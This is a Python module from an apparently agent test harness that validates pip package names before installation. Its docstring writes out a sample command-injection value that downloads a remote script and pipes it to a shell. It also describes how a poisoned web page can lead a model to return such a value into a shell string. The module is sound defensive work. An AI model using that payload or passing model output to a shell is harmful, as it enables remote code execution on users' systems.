"""Validate a pip package name before installing it.

WHY THIS EXISTS. Two paths in this harness install a package whose name did not
come from the repository:

    test_runner._web_pip_name       (grading-time missing-module reflex)
    swe_agent_v2__web_lookup_pkg    (bootstrap-time missing-module reflex)

Both take an unresolved import name, web-search it, and ask the MODEL for the
pip name -- then interpolate that answer into a shell string:

    subprocess.run(f'{py} -m pip install "{looked}"', shell=True, ...)

Model output reaching shell=True is command injection. A returned value of

    x"; curl http://host/s.sh | sh; echo "

runs. The model does not have to be adversarial for this to fire; it only has
to echo a search snippet from a page that is.

TWO INDEPENDENT DEFENCES, because filtering alone is recognition and
recognition has failed twice already in this project:

  1. STRUCTURAL -- callers pass argv LISTS, never a shell string. Nothing the
     model returns can act as a metacharacter, because there is no shell to
     parse it. This is the defence that actually holds.

  2. SYNTACTIC -- safe_pkg() accepts only a bare PEP 508 project name of
     bounded length. Belt to the structural braces, and it also stops the
     merely absurd (a sentence, a URL, a path) before it costs an install.

ONE ADVISORY SIGNAL, never a block:

  relatedness() reports whether the looked-up name plausibly corresponds to the
  import name we actually saw. A typosquat's tell is a name nobody meant
  ("requets" for "requests"), and that is the failure mode worth watching. We
  RECORD it rather than refuse, because refusing a legitimate rename
  (Crypto -> pycryptodome, bs4 -> beautifulsoup4) costs a whole instance, and
  the curated alias map is the right place to fix those. A fact with a value,
  never a suggestion.
"""
import re

# PEP 508: a name starts and ends alphanumeric, and may contain . - _ between.
# No version specifier, no extras, no URL, no whitespace. 64 chars is far above
# the longest real package name and far below anything that hides a payload.
_PEP508 = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9._-]{0,62}[A-Za-z0-9])?$")

MAX_LEN = 64


def safe_pkg(name):
    """Return the name if it is a bare PEP 508 project name, else None."""
    if not isinstance(name, str):
        return None
    n = name.strip()
    if not n or len(n) > MAX_LEN:
        return None
    if not _PEP508.match(n):
        return None
    return n


def _norm(s):
    return re.sub(r"[^a-z0-9]", "", (s or "").lower())


def relatedness(mod, pkg):
    """How close is the pip name to the import name? Advisory, not a verdict.

    'exact'    normalised forms match                (yaml / PyYAML)
    'prefix'   one is a prefix of the other          (PIL / pillow)
    'contains' one contains the other                (dateutil / python-dateutil)
    'distant'  no lexical relation                   (bs4 / beautifulsoup4, and
                                                      also requests / requets)
    """
    a, b = _norm(mod.split(".")[0]), _norm(pkg)
    if not a or not b:
        return "distant"
    if a == b:
        return "exact"
    if a.startswith(b) or b.startswith(a):
        return "prefix"
    if a in b or b in a:
        return "contains"
    return "distant"


def pip_argv(python, pkg):
    """The install command as an argv list. Raises on an unsafe name.

    Callers MUST use this instead of building a shell string, and MUST pass
    shell=False (the default for a list).
    """
    ok = safe_pkg(pkg)
    if ok is None:
        raise ValueError("refusing unsafe pip package name: %r" % (pkg,))
    return [python, "-m", "pip", "install", ok]
